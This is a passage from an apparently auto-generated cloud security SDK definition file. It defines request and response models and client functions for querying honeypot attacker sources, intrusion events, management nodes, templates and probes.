  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
  riskLevelList?: [ string ](name='RiskLevelList', description='An array that consists of risk levels.'),
  srcIp?: string(name='SrcIp', description='The source IP address of the attack.', example='175.136.230.***'),
  startTimeStamp?: long(name='StartTimeStamp', description='The beginning of the time range to query. This value is a timestamp.', example='1674007632124'),
}

model ListHoneypotAttackerSourceResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  list?: [ 
    {
      eventCount?: int32(name='EventCount', description='The total number of attack events.', example='30'),
      lastTargetHoneypot?: string(name='LastTargetHoneypot', description='The most recent honeypot that was attacked.', example='vpc tcp honeypot'),
      lastTargetIp?: string(name='LastTargetIp', description='The most recent IP address that was attacked.', example='144.23.66.***'),
      lastTime?: long(name='LastTime', description='The last time when the attack event occurred.', example='1693446913000'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **2**: low
*   **3**: medium
*   **4**: high', example='2'),
      srcIp?: string(name='SrcIp', description='The source IP address of the attack.', example='101.102.61.***'),
    }
  ](name='List', description='The source IP addresses of the attack.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='55'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='9915DC4D-B4DA-5140-8138-FD80636*****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model ListHoneypotAttackerSourceResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListHoneypotAttackerSourceResponseBody(name='body'),
}

/**
 * @summary Queries the attack source IP addresses that are used to attack a honeypot.
 *
 * @param request ListHoneypotAttackerSourceRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListHoneypotAttackerSourceResponse
 */
async function listHoneypotAttackerSourceWithOptions(request: ListHoneypotAttackerSourceRequest, runtime: Util.RuntimeOptions): ListHoneypotAttackerSourceResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTimeStamp)) {
    query['EndTimeStamp'] = request.endTimeStamp;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskLevelList)) {
    query['RiskLevelList'] = request.riskLevelList;
  }
  if (!Util.isUnset(request.srcIp)) {
    query['SrcIp'] = request.srcIp;
  }
  if (!Util.isUnset(request.startTimeStamp)) {
    query['StartTimeStamp'] = request.startTimeStamp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotAttackerSource',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the attack source IP addresses that are used to attack a honeypot.
 *
 * @param request ListHoneypotAttackerSourceRequest
 * @return ListHoneypotAttackerSourceResponse
 */
async function listHoneypotAttackerSource(request: ListHoneypotAttackerSourceRequest): ListHoneypotAttackerSourceResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotAttackerSourceWithOptions(request, runtime);
}

model ListHoneypotEventFlowsRequest {
  currentPage?: int32(name='CurrentPage'),
  dealed?: string(name='Dealed'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  securityEventId?: long(name='SecurityEventId'),
}

model ListHoneypotEventFlowsResponseBody = {
  code?: string(name='Code', description='The status code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotEventFlows?: [ 
    {
      agentId?: string(name='AgentId', description='The ID of the probe.', example='d3c0dafa-5059-4eb0-8c28-7d40f58*****'),
      agentName?: string(name='AgentName', description='The name of the probe.', example='hw-d***'),
      dockerId?: string(name='DockerId', description='The ID of the container.', example='eca09895****'),
      dstIp?: string(name='DstIp', description='The destination IP address.', example='112.126.205.***'),
      dstPort?: int32(name='DstPort', description='The destination port.', example='80'),
      eventConnection?: string(name='EventConnection', description='The UUID of the connection in the attack.', example='fd7f1ff4-0c4b-41cb-99ad-0724349d****'),
      extra?: string(name='Extra', description='The extended information about the attack payload.', example='{\\\\"payload\\\\":{\\\\"format\\\\":\\\\"line\\\\",\\\\"name\\\\":{\\\\"cn\\\\":\\\\"payload\\\\",\\\\"en\\\\":\\\\"payload\\\\"},\\\\"value\\\\":\\\\"\\\\"},\\\\"uid\\\\":{\\\\"format\\\\":\\\\"line\\\\",\\\\"name\\\\":{\\\\"cn\\\\":\\\\"\\\\",\\\\"en\\\\":\\\\"\\\\"},\\\\"uid\\\\":\\\\"5fa2ece9-aa08-4bbd-a272-5d27*********\\\\",\\\\"value\\\\":\\\\"\\\\"}}'),
      extra1?: string(name='Extra1', description='The extension information about the virtual private cloud (VPC).', example='{\\\\"vpc_id\\\\":\\\\"\\\\",\\\\"vpc_dest_port\\\\":\\\\"\\\\",\\\\"vpc_dest_ip\\\\":\\\\"\\\\"}'),
      fileOssUrl?: string(name='FileOssUrl', description='The Object Storage Service (OSS) URL of the file.', example='https://pop-test-file-upload.oss-cn-beijing.aliyuncs.com/5626_26331*****'),
      firstTime?: long(name='FirstTime', description='The timestamp when the intrusion event was first occurred.', example='1686621122000'),
      honeypotEventId?: string(name='HoneypotEventId', description='The ID of the intrusion event. The value is a string.', example='19bec028-d98b-45c4-a4d9-cc3d593f****'),
      honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.', example='911df9d6fe20451c059edbcffa1d1c33452f6a71e59d4826da067af224*****'),
      honeypotName?: string(name='HoneypotName', description='The name of the honeypot.', example='hw-zhi*****'),
      lastTime?: long(name='LastTime', description='The timestamp when the intrusion event was last occurred.', example='1686622222000'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **2**: low
*   **3**: medium
*   **4**: high', example='4'),
      securityEventId?: long(name='SecurityEventId', description='The ID of the intrusion event.', example='306527555'),
      srcIp?: string(name='SrcIp', description='The source IP address.', example='121.41.48.***'),
      srcMac?: string(name='SrcMac', description='The source media access control (MAC) address.', example='00:0C:29:CA:**:**'),
      srcPort?: int32(name='SrcPort', description='The source port number.', example='80'),
      status?: int32(name='Status', description='The handling status of the intrusion event. Valid values:

*   **1**: pending handling
*   **2**: ignored
*   **4**: confirmed', example='1'),
      typeId?: string(name='TypeId', description='The ID of the attack type.', example='web_access'),
      uid?: string(name='Uid', description='The UUID of an attack in the intrusion event.', example='5fa2ece9-aa08-4bbd-a272-5d27d1c6*****'),
    }
  ](name='HoneypotEventFlows', description='The attack timelines.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='78'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='9F4E6157-9600-5588-86B9-38F09067****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model ListHoneypotEventFlowsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListHoneypotEventFlowsResponseBody(name='body'),
}

/**
 * @summary Queries the details of an intrusion event in a honeypot.
 *
 * @param request ListHoneypotEventFlowsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListHoneypotEventFlowsResponse
 */
async function listHoneypotEventFlowsWithOptions(request: ListHoneypotEventFlowsRequest, runtime: Util.RuntimeOptions): ListHoneypotEventFlowsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.requestId)) {
    query['RequestId'] = request.requestId;
  }
  if (!Util.isUnset(request.securityEventId)) {
    query['SecurityEventId'] = request.securityEventId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotEventFlows',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of an intrusion event in a honeypot.
 *
 * @param request ListHoneypotEventFlowsRequest
 * @return ListHoneypotEventFlowsResponse
 */
async function listHoneypotEventFlows(request: ListHoneypotEventFlowsRequest): ListHoneypotEventFlowsResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotEventFlowsWithOptions(request, runtime);
}

model ListHoneypotEventsRequest {
  agentIdList?: [ string ](name='AgentIdList', description='The probe IDs.'),
  alarmEventId?: long(name='AlarmEventId', description='The ID of the alert.', example='1259925'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  dealed?: string(name='Dealed', description='The status of the event. Valid values:

*   **y**: handled
*   **n**: unhandled
*   **a**: all statuses', example='y'),
  honeypotIdList?: [ string ](name='HoneypotIdList', description='The honeypot IDs.'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **20**.', example='10'),
  portraitId?: string(name='PortraitId', description='The ID of the attacker profile.', example='cd48604a-1694-4f03-ade0-ec6994c3*****'),
  requestId?: string(name='RequestId', description='The request ID.', example='2F9CE167-58D5-5DA6-AA3B-923EED02****'),
  riskLevelList?: [ string ](name='RiskLevelList', description='The risk levels.'),
  srcIp?: string(name='SrcIp', description='The source IP address of the attack.', example='185.237.96.***'),
}

model ListHoneypotEventsResponseBody = {
  honeypotEvents?: [ 
    {
      agentId?: string(name='AgentId', description='The probe ID.', example='27d44bd5815d401992ea672874d9****'),
      agentName?: string(name='AgentName', description='The name of the probe.', example='1193474_test_****'),
      alarmEventId?: long(name='AlarmEventId', description='The ID of the alert event.', example='1900752'),
      dstIp?: string(name='DstIp', description='The destination IP address of the attack.', example='112.126.205.***'),
      firstTime?: long(name='FirstTime', description='The timestamp at which the event was first detected.', example='1692670297'),
      honeypotName?: string(name='HoneypotName', description='The name of the honeypot.', example='honeypot-2'),
      lastTime?: long(name='LastTime', description='The timestamp at which the event was last detected.', example='1676558664'),
      location?: string(name='Location', description='The region.', example='China Beijing'),
      mergeFieldList?: [ 
        {
          fieldExtInfo?: string(name='FieldExtInfo', description='The supplementary information about the field.', example='data'),
          fieldKey?: string(name='FieldKey', description='The key of the field.', example='type'),
          fieldType?: string(name='FieldType', description='The type of the field.', example='level2_item1'),
          fieldValue?: string(name='FieldValue', description='The value of the field key.', example='web_access'),
        }
      ](name='MergeFieldList', description='The extended values that correspond to the field key.'),
      protocol?: string(name='Protocol', description='The protocol. Valid values:

*   **tcp**
*   **udp**', example='tcp'),
      riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **2**: low
*   **3**: medium
*   **4**: high', example='4'),
      securityEventId?: long(name='SecurityEventId', description='The ID of the intrusion event.', example='70427821'),
      srcIp?: string(name='SrcIp', description='The source IP address of the attack.', example='192.168.62.***'),
    }
  ](name='HoneypotEvents', description='The intrusion events.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    lastRowKey?: string(name='LastRowKey', description='The key of the last data entry.', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY*********'),
    nextToken?: string(name='NextToken', description='The value of the NextToken parameter that is returned by using the NextToken method.', example='B604532DEF982B875E8360A6EFA3B***'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='30'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='FBD28009-6096-5E90-BFE6-62CCD67*****'),
}

model ListHoneypotEventsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListHoneypotEventsResponseBody(name='body'),
}

/**
 * @summary Queries the intrusion events detected by honeypots.
 *
 * @param request ListHoneypotEventsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListHoneypotEventsResponse
 */
async function listHoneypotEventsWithOptions(request: ListHoneypotEventsRequest, runtime: Util.RuntimeOptions): ListHoneypotEventsResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the intrusion events detected by honeypots.
 *
 * @param request ListHoneypotEventsRequest
 * @return ListHoneypotEventsResponse
 */
async function listHoneypotEvents(request: ListHoneypotEventsRequest): ListHoneypotEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotEventsWithOptions(request, runtime);
}

model ListHoneypotNodeRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  nodeId?: string(name='NodeId', description='The ID of the management node.', example='7d110ca6-05ee-4149-8042-13ad1a41fd****'),
  nodeName?: string(name='NodeName', description='The name of the management node.', example='cyct_cnymu'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
}

model ListHoneypotNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotNodeList?: [ 
    {
      allowHoneypotAccessInternet?: boolean(name='AllowHoneypotAccessInternet', description='Indicates whether a honeypot is allowed to access the Internet. Valid values:

*   **true**: The honeypot is allowed to access the Internet.
*   **false**: The honeypot is not allowed to access the Internet.', example='true'),
      createTime?: string(name='CreateTime', description='The time when the management node was created.', example='2022-08-04 15:52:56'),
      defaultNode?: boolean(name='DefaultNode', description='The type of the management node. Default value: **false**. Valid values:

*   **false**: non-default type
*   **true**: default type', example='false'),
      ecsInstanceId?: string(name='EcsInstanceId', description='The ID of the instance.', example='i-bp1fs3qsc1msa3512k****'),
      honeypotTotalCount?: int32(name='HoneypotTotalCount', description='The maximum number of honeypots that can be deployed to the management node.', example='10'),
      honeypotUsedCount?: int32(name='HoneypotUsedCount', description='The number of honeypots that are deployed to the management node.', example='2'),
      nodeId?: string(name='NodeId', description='The ID of the management node.', example='7d110ca6-05ee-4149-8042-13ad1a41fd****'),
      nodeIp?: string(name='NodeIp', description='The IP address of the management node.', example='119.180.XX.XX'),
      nodeName?: string(name='NodeName', description='The name of the management node.', example='cyct_cnymu'),
      probeTotalCount?: int32(name='ProbeTotalCount', description='The maximum number of probes that can be deployed for the management node.', example='5'),
      probeUsedCount?: int32(name='ProbeUsedCount', description='The number of probes that are deployed for the management node.', example='2'),
      securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList', description='An array consisting of the CIDR blocks that are allowed to access the management node.'),
      totalStatus?: int32(name='TotalStatus', description='The status of the management node. Valid values:

*   **1**: normal
*   **2**: abnormal', example='1'),
      upgradeAvailable?: boolean(name='UpgradeAvailable', description='Indicates whether the management node can be upgraded. Valid values:

*   **false**: no
*   **true**: yes', example='true'),
    }
  ](name='HoneypotNodeList', description='An array that consists of the information about the management nodes.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='149'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='337BEA70-B03D-5370-8420-436F3FCD9924'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListHoneypotNodeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListHoneypotNodeResponseBody(name='body'),
}

/**
 * @summary Queries the information about management nodes.
 *
 * @param request ListHoneypotNodeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListHoneypotNodeResponse
 */
async function listHoneypotNodeWithOptions(request: ListHoneypotNodeRequest, runtime: Util.RuntimeOptions): ListHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about management nodes.
 *
 * @param request ListHoneypotNodeRequest
 * @return ListHoneypotNodeResponse
 */
async function listHoneypotNode(request: ListHoneypotNodeRequest): ListHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotNodeWithOptions(request, runtime);
}

model ListHoneypotPresetRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.', example='ruoyi'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
  nodeId?: string(name='NodeId', description='The ID of the management node.', example='d892b4fe-af0d-4486-ab2a-8a518045****'),
  nodeName?: string(name='NodeName', description='The name of the management node.', example='Node1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  presetName?: string(name='PresetName', description='The custom name of the honeypot template.', example='mx-rouyi'),
}

model ListHoneypotPresetResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  list?: [ 
    {
      controlNodeName?: string(name='ControlNodeName', description='The name of the management node.', example='node1'),
      honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the honeypot image.', example='Metabase'),
      honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.', example='metabase'),
      honeypotPresetId?: string(name='HoneypotPresetId', description='The ID of the honeypot template.', example='3cc04a47-7229-418c-8101-f10a2887****'),
      nodeId?: string(name='NodeId', description='The ID of the management node.', example='c94eff5b-ea48-4805-8b7f-e04d3509****'),
      presetName?: string(name='PresetName', description='The custom name of the honeypot template.', example='WebMin-online'),
      presetType?: string(name='PresetType', description='The type of the honeypot template. Valid values:

*   **TEMP**: automatically generated template
*   **CUSTOM**: custom template
*   **DEFAULT**: default template', example='CUSTOM'),
    }
  ](name='List', description='An array that consists of the honeypot templates.'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 20.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='55'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0C656B33-0D6B-5953-A26A-D766BD75B44A'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListHoneypotPresetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListHoneypotPresetResponseBody(name='body'),
}

/**
 * @summary Queries honeypot templates.
 *
 * @param request ListHoneypotPresetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListHoneypotPresetResponse
 */
async function listHoneypotPresetWithOptions(request: ListHoneypotPresetRequest, runtime: Util.RuntimeOptions): ListHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.presetName)) {
    query['PresetName'] = request.presetName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries honeypot templates.
 *
 * @param request ListHoneypotPresetRequest
 * @return ListHoneypotPresetResponse
 */
async function listHoneypotPreset(request: ListHoneypotPresetRequest): ListHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotPresetWithOptions(request, runtime);
}

model ListHoneypotProbeRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1'),
  displayName?: string(name='DisplayName', description='The name of the probe.', example='probe-test'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  probeStatus?: string(name='ProbeStatus', description='The status of the probe. Valid values:

*   **installed**: installed
*   **install_failed**: installation failed
*   **online**: online
*   **offline**: offline
*   **unnormal**: abnormal
*   **unprobe**: unauthorized
*   **uninstalling**: being uninstalled
*   **uninstalled**: uninstalled
*   **uninstall_failed**: uninstallation failed
*   **not_exist**: not installed', example='online'),
  probeType?: string(name='ProbeType', description='The type of the probe. Valid values:

*   **host_probe**: host probe
*   **vpc_black_hole_probe**: VPC probe', example='host_probe'),
}

model ListHoneypotProbeResponseBody = {
  code?: string(name='Code', description='The status code that is returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  list?: [ 
    {
      controlNode?: {
        ecsInstanceId?: string(name='EcsInstanceId', description='The ID of the Elastic Compute Service (ECS) instance.', example='i-uf6eq0rlvu1mkh0p****'),
        nodeId?: string(name='NodeId', description='The ID of the node.', example='8ec9da17-c0e7-4642-aad6-defc9722****'),
        nodeName?: string(name='NodeName', description='The name of the node.', example='HoneypotNode1'),
      }(name='ControlNode', description='The information about the management node.'),
      deployTime?: long(name='DeployTime', description='The time when the probe was deployed.', example='1669363825000'),
      displayName?: string(name='DisplayName', description='The name of the probe.', example='prod-pinpoint-hd1b'),
      hostIp?: string(name='HostIp', description='The IP address of the server on which the probe is installed.', example='33.53.XX.XX'),
      osType?: string(name='OsType', description='The operating system of the server on which the probe is deployed. Valid values:

*   windows
*   linux', example='windows'),
      probeId?: string(name='ProbeId', description='The ID of the probe.', example='4d167bb3-dd09-4a6a-a179-d5d6a5b0****'),
      probeType?: string(name='ProbeType', description='The type of the probe. Valid values:

*   **host_probe**: host probe
*   **vpc_black_hole_probe**: VPC probe', example='host_probe'),
      probeVersion?: string(name='ProbeVersion', description='The version of the probe.', example='18060096'),
      status?: string(name='Status', description='The status of the probe. Valid values:

*   **installed**: installed
*   **install_failed**: installation failed
*   **online**: online
*   **offline**: offline
*   **unnormal**: abnormal
*   **unprobe**: unauthorized
*   **uninstalling**: being uninstalled
*   **uninstalled**: uninstalled
*   **uninstall_failed**: uninstallation failed
*   **not_exist**: not installed', example='online'),
      uuid?: string(name='Uuid', description='The UUID of the server to which the host probe is deployed.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
      vpcId?: string(name='VpcId', description='The ID of the VPC in which the VPC probe is deployed.', example='vpc-5gu8iu68w9b472jbb****'),
    }
  ](name='List', description='An array that consists of the details about the probe.'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='30'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4BC9E610-21BE-537F-82EF-144A60D5A970'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListHoneypotProbeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ListHoneypotProbeResponseBody(name='body'),
}

/**
 * @summary Queries probes.
 *
 * @param request ListHoneypotProbeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ListHoneypotProbeResponse
 */
async function listHoneypotProbeWithOptions(request: ListHoneypotProbeRequest, runtime: Util.RuntimeOptions): ListHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.displayName)) {
    query['DisplayName'] = request.displayName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.probeStatus)) {
    query['ProbeStatus'] = request.probeStatus;
  }
  if (!Util.isUnset(request.probeType)) {
    query['ProbeType'] = request.probeType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries probes.
 *
 * @param request ListHoneypotProbeRequest
 * @return ListHoneypotProbeResponse
 */
async function listHoneypotProbe(request: ListHoneypotProbeRequest): ListHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotProbeWithOptions(request, runtime);
}

